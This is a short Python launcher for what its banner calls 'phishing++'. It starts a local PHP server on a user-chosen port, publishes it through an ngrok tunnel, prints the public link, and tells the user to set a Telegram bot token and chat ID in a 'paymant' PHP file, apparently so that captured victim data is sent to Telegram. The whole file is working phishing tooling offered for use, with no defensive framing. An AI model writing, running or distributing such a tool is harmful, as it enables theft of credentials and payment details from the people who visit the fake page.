import os
from colorama import Fore
import time
from pyngrok import ngrok
from subprocess import Popen
print(Fore.GREEN)
os.system("clear")
print("""


       .__    .__       .__    .__                                        
______ |  |__ |__| _____|  |__ |__| ____    ____      .__         .__     
\____ \|  |  \|  |/  ___/  |  \|  |/    \  / ___\   __|  |___   __|  |___ 
|  |_> >   Y  \  |\___ \|   Y  \  |   |  \/ /_/  > /__    __/  /__    __/ 
|   __/|___|  /__/____  >___|  /__|___|  /\___  /     |__|        |__|    
|__|        \/        \/     \/        \//_____/                          
                                                                          
-------------------
•https://github.com/Mobin-Dan
•t.me/termux_learning
•follow my github
-------------------

""")
re =input(Fore.RED+"[PORT]"+" =>")
with open("server","w") as phplog:
    Popen(("php","-S","localhost:"+re),stderr=phplog ,stdout=phplog)
print(Fore.GREEN)
link=ngrok.connect(re,"http")
print(link)
print(Fore.GREEN+"just edit paymant/Telegram.php (token and chat_id)")
input("")

